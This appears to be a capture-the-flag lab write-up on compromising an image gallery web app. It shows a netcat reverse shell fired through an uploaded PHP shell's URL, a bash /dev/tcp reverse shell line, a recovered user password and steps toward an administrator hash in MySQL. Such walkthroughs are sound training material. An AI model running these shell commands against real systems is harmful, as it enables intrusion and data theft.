1. Search exploits for simple image gallery
![[gallery5.png]]

2. Copy the exploit to the current directory
![[gallery6.png]]

3. Exploit the machine
![[gallery7.png]]
Now, if navigate to the below url then we get to see the username of the user that operate the server.

4. Now, we can upload a php reverse shell and catch it to a netcat listener
**Starting netcat listener** - 
```python
nc -lvnp 4444
```

**URL after injecting php shell code** - 
```php
http://10.10.105.111/gallery/uploads/1694663640_TagodtgwferaobabyecLetta.php?cmd=mkfifo+/tmp/f%3b+nc+10.17.47.177+443+<+/tmp/f+|+/bin/sh+>/tmp/f+2>%261%3b+rm+/tmp/f
```

5. shell stabilisation after getting a reverse shell in the target.
![[gallery8.png]]

6. After lot of other stuffs like linpeas.sh and looking inside of crontab we found a `backup_history` file inside `var` directory and there we got the credentials for user mike.
![[gallery9.png]]

bash -i >& /dev/tcp/10.17.47.177/4444 0>&1

password for mike is "b3stpassw0rdbr0xx"

## Administrator hash
1. MySQL creadential found 
![[gallery16.png]]

2. Connect to the MySQL database
```python
mysql -u username -p
```

3. Administrator hash found in the users table.
![[gallery17.png]]
